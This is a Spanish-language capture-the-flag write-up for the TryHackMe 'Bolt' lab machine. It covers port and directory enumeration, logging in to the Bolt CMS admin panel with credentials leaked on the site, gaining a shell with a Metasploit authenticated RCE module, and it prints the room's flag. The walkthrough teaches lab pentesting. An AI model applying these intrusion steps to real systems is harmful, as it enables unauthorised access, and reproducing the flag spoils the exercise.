# Write-up: 

- **Nombre de la máquina:** `Bolt` 
- **Plataforma:** `TryHackMe` 
- **IP:** `10.10.143.132` 
- **SO:** `Linux` 
- **Dificultad:** `Easy`
- https://tryhackme.com/room/bolt

---

## 1. RECONOCIMIENTO

El objetivo de esta fase es identificar los puntos de entrada y servicios expuestos en la máquina víctima.

#### 1.1. Verificación de Conectividad

Se lanza un `ping` para confirmar que la máquina está activa y obtener el TTL lo que puede darnos una primera pista sobre el sistema operativo.
```
	ping 10.10.143.132
```
Nos devuelve conectividad y un TTL=64 por lo que estamos ante una máquina Linux.


![](Imagenes/50.png)

#### 1.2. Escaneo de Puertos

Se realiza un escaneo con **Nmap** para descubrir puertos abiertos, los servicios que corren en ellos y sus versiones.

```
sudo nmap -p- -sV -sC -sS --min-rate 5000 --open -n -Pn 10.10.143.132 -oN port_scan.txt
```

**Puertos Descubiertos:**

| Puerto | Servicio | Versión       | Notas                     |
| ------ | -------- | ------------- | ------------------------- |
| 22     | ssh      | OpenSSH 7.6   | Necesitamos credenciales  |
| 80     | http     | Apache 2.4.29 | Página inicio apache      |
| 8000   | http     | PHP 7.2.32-1  | Más superficie de ataque. |



![](Imagenes/51.png)

Normalmente el acceso por el puerto 22 al servicio ssh requiere de credenciales. Ya sea usuario y contraseña o clave rsa. En este caso carecemos de información al respecto así que lo más productivo es explorar el servicio http. 

---

## 2. ENUMERACIÓN

Una vez identificados los servicios, se procede a investigarlos en profundidad en busca de vulnerabilidades o información útil.

### Puerto 80 ( HTTP)

#### Enumeración Manual:

- **Navegación web:** Se visita el sitio en `http://10.10.143.132.
  
    Tenemos  página de inicio de Apache: 

     ![](Imagenes/52.png)
- **Análisis del código fuente:** Se revisa el HTML en busca de comentarios, rutas o scripts ocultos.
  
    Tenemos una página del bug arreglado en la última actualización. :

	![](Imagenes/53.png)
- **Archivos comunes:** Se buscan manualmente archivos y directorios comunes:
	- `/robots.txt`-->X
	- `/sitemap.xml`--> X
	- `/login`--> X
	- `/admin`--> X
	- `/panel`--> X
	- `/user`--> X
	- `/panel`--> X
	- `backup`--> X
	- `uploads`--> X
	- `test, etc.`--> X
    
#### Enumeración Automática:

- Lanzamos la herramienta `whatweb` para que nos de información sobre la aplicación web. 
```
whatweb 10.10.143.132
```

![](Imagenes/54.png)

Nos nos devuelve nada.


- Lanzamos la herramienta de enumeración `gobuster` para buscar directorios ocultos y extensiones .php,.txt y .html 

```
gobuster dir -u http://10.10.143.132/ -w /urs/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -k
```


![](Imagenes/55.png)

**Hallazgos:**

- Nos de vuelve que no hay repuesta ala petición. Este amigo... no es el camino... 


### Puerto 8000 ( HTTP)

#### Enumeración Manual:

- **Navegación web:** Se visita el sitio en `http://10.10.143.132:8000
  
    Tenemos  página de Bolt : 

     ![](Imagenes/56.png)
	
	**Encontramos mensajes con posibles credenciales** 
	![](Imagenes/57.png)
	![](Imagenes/58.png)
- **Hallazgos:
	- Username: `bolt`
	- Password: `boltadmin123`
- **Análisis del código fuente:** Se revisa el HTML en busca de comentarios, rutas o scripts ocultos.
  
  No encontramos nada. :

	![](Imagenes/59.png)
- **Archivos comunes:** Se buscan manualmente archivos y directorios comunes:
	- `/robots.txt`-->X
	- `/sitemap.xml`--> X
	- `/login`--> X
	- `/admin`--> X
	- `/panel`--> X
	- `/user`--> X
	- `/panel`--> X
	- `backup`--> X
	- `uploads`--> X
	- `test, etc.`--> X
	- `bolt`--> es importante añadir que es un directorio de login por defecto en los CMS de `BOLT` 
	  https://docs.boltcms.io/5.2/manual/login
- **Hallazgos**
	- Encontramos un panel de login
	   ![](Imagenes/60.png)
#### Enumeración Automática:

- Lanzamos la herramienta de enumeración `gobuster` para buscar directorios ocultos y extensiones .php,.txt y .html 

```
gobuster dir -u http://10.10.143.132:8000/ -w /urs/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -k
```

![](Imagenes/61.png)


**Hallazgos:**

- En este punto teniendo el panel de login y las credenciales. No son rutas relevantes. 
#### Comprobación de credenciales:

 1. Accedemos con las credenciales encontradas en los mensajes internos:
	 ![](Imagenes/62.png)
  
  2. Tenemos acceso
    ![](Imagenes/63.png)
	
-  Hallazgos:
   -  Observamos la versión de Bolt en la parte inferior izquierda.
   `Bolt 3.7.1`

#### Comprobación vulnerabilidad (RCE)

1. Abrimos consola:
```
	msfconsole -q
```
2.  Buscamos vulnerabilidad para vulnerabilidades conocidas para esta versión de Bolt ( Authenticated Remote Code Execution).
   
```
	search bolt 3.7.1
```
Pese a que nuestro Bolt es de una versión posterior. Parece no parchear el error y este exploit es funcional. 
	![](Imagenes/64.png)
	   

---

## 3. EXPLOTACIÓN

### 3.1 Acceso inicial:

Configuramos el exploit en base a lo que nos requiere siguiendo estos pasos:

1. `use 0`. ==exploit/unix/webapp/bolt_authenticated_rce==
2. `show options` (falta LHOST, RHOST, USERNAME, PASSWORD )
   ![](Imagenes/65.png)
3. `set PASSWORD boltadmin123`
4. `set RHOST 10.10.143.132`
5. `set USERNAME bolt`
6. `run`

	  ![](Imagenes/66.png)


De esta forma hemos conseguido establecer comunicación hacía nuestra terminal. 

### Estabilización de la TTY:

Buscamos una shell semi-interactiva. Que ya nos arroja el promt. 

```
script /dev/null -c bash
```

![](Imagenes/67.png)

---

## 4. ESCALADA DE PRIVILEGIOS

En esta máquina hemos entrado como usuario `root` por lo que no es necesario elevar privilegios. 

### 4.1. Enumeración Interna

Se realizan comprobaciones básicas.

#### Comprobaciones del sistema:

¿Qué usuario somos?
`whoami`

![](Imagenes/68.png)


¿Qué usuario hay en el sistema?
`cd home` y `ls`

 
 ![](Imagenes/69.png)

- Hallazgos:
  - Podemos encontrar el archivo flag.txt


---

## 5. CAPTURA DE BANDERAS (FLAGS)

Con acceso privilegiado, se buscan y leen las banderas.

#### Bandera de root (flag.txt)

- **Ubicación:** `/home/flag.txt`
    
- **Contenido:** `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`
    

Respuestas en THM:

![](Imagenes/70.png)
Todas se han ido resolviendo en el transcurso de la resolución de la máquina salvo el ID del exploit de BOLT que se encuentra en la documentación de exploit.db: 

https://www.exploit-db.com/exploits/48296
![](Imagenes/71.png)
